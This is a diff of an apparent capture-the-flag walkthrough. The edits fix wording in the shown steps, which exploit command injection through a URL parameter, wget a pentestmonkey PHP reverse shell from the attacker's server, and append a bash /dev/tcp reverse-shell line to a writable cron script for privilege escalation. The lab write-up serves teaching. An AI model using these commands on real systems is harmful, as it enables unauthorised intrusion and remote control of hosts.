@@ -72,10 +72,10 @@ let us try and add **&cmd=ls** to the end of the url.
 We can actually run commands on it. so next let us try and get a reverse shell.
 
 # SHELL
-So we are going to get a sample php reverseshell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
-Next we are going to set up a python server on our machine. 
-Next we are going to run **&cmd=wget http://ip/revshell.php**
-We should be able to get a 200 code on our machin e.
+So we are going to get a sample php reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
+Next, we are going to set up a python server on our machine. 
+Next, we are going to run **&cmd=wget http://ip/revshell.php**
+We should be able to get a 200 code on our machine.
 ![](https://i.ibb.co/4jKLJfz/httpserver.png)
 
 next start up a listener on your machine
@@ -93,6 +93,8 @@ Then we can check out the cron jobs **cat /etc/crontab**
 
 We can actually see that a job runs as archangel every minute. Which we can read and write.
 So we then run **echo "bash -i >& /dev/tcp/ip/1235 0>&1" >> /opt/helloworld.sh**
+
+![](https://i.ibb.co/qFqjRB3/archangel.png)
 
 Then run another listener and wait for a minute. Coffee break.
 
